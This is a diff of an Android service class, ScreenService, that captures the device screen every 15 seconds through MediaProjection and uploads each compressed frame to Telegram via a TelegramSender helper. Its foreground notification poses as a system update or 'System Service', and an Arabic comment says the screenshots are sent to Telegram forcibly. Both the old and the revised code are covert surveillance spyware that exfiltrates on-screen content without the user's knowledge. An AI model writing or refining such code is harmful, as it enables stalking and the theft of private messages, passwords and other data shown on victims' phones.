@@ -1,84 +1,75 @@
 package com.tom5.monitor;
 
 import android.app.*;
-import android.content.Context;
-import android.content.Intent;
-import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
-import android.media.Image;
-import android.media.ImageReader;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
-import android.os.Handler;
-import android.os.IBinder;
+import android.content.*;
+import android.graphics.*;
+import android.hardware.display.*;
+import android.media.*;
+import android.media.projection.*;
+import android.os.*;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 import androidx.core.app.NotificationCompat;
-import java.io.File;
-import java.io.FileOutputStream;
+import java.io.*;
 import java.nio.ByteBuffer;
 
 public class ScreenService extends Service {
     private MediaProjection mediaProjection;
     private VirtualDisplay virtualDisplay;
     private ImageReader imageReader;
-    private Handler handler = new Handler();
+    private Handler handler = new Handler(Looper.getMainLooper());
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // إشعار الخدمة الأمامية (ضروري جداً)
-        String channelId = "sys_update";
-        NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
-        getSystemService(NotificationManager.class).createNotificationChannel(channel);
-        startForeground(1, new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("جاري تحديث النظام")
+        createChannel();
+        startForeground(1, new NotificationCompat.Builder(this, "core")
+                .setContentTitle("System Service")
                 .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
 
         if (intent != null && intent.hasExtra("resData")) {
-            int resCode = intent.getIntExtra("resCode", -1);
-            Intent resData = intent.getParcelableExtra("resData");
-            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-            mediaProjection = mpm.getMediaProjection(resCode, resData);
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            mediaProjection = mpm.getMediaProjection(intent.getIntExtra("resCode", -1), (Intent) intent.getParcelableExtra("resData"));
             startCapture();
         }
         return START_STICKY;
     }
 
     private void startCapture() {
-        DisplayMetrics metrics = new DisplayMetrics();
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        wm.getDefaultDisplay().getMetrics(metrics);
-        
-        imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
+        DisplayMetrics dm = new DisplayMetrics();
+        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(dm);
+        imageReader = ImageReader.newInstance(dm.widthPixels / 2, dm.heightPixels / 2, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay("Cap", dm.widthPixels / 2, dm.heightPixels / 2, dm.densityDpi, 16, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
                 capture();
-                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
+                handler.postDelayed(this, 15000); // صورة كل 15 ثانية
             }
         }, 5000);
     }
 
     private void capture() {
-        try (Image image = imageReader.acquireLatestImage()) {
-            if (image != null) {
-                Image.Plane[] planes = image.getPlanes();
-                ByteBuffer buffer = planes[0].getBuffer();
-                Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                
-                File file = new File(getCacheDir(), "t.jpg");
-                try (FileOutputStream out = new FileOutputStream(file)) {
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out);
-                    // الإرسال لتيليجرام خاوة
-                    TelegramSender.sendPhoto(file);
-                }
-                bitmap.recycle();
+        Image img = imageReader.acquireLatestImage();
+        if (img == null) return;
+        try {
+            Image.Plane[] planes = img.getPlanes();
+            ByteBuffer buffer = planes[0].getBuffer();
+            Bitmap b = Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);
+            b.copyPixelsFromBuffer(buffer);
+            File f = new File(getCacheDir(), "t.jpg");
+            try (FileOutputStream out = new FileOutputStream(f)) {
+                b.compress(Bitmap.CompressFormat.JPEG, 30, out);
+                TelegramSender.sendPhoto(f);
             }
-        } catch (Exception e) {}
+            b.recycle();
+        } catch (Exception ignored) {} finally {
+            img.close(); // أهم سطر لمنع الكراش
+        }
+    }
+
+    private void createChannel() {
+        NotificationChannel c = new NotificationChannel("core", "Core", NotificationManager.IMPORTANCE_LOW);
+        getSystemService(NotificationManager.class).createNotificationChannel(c);
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
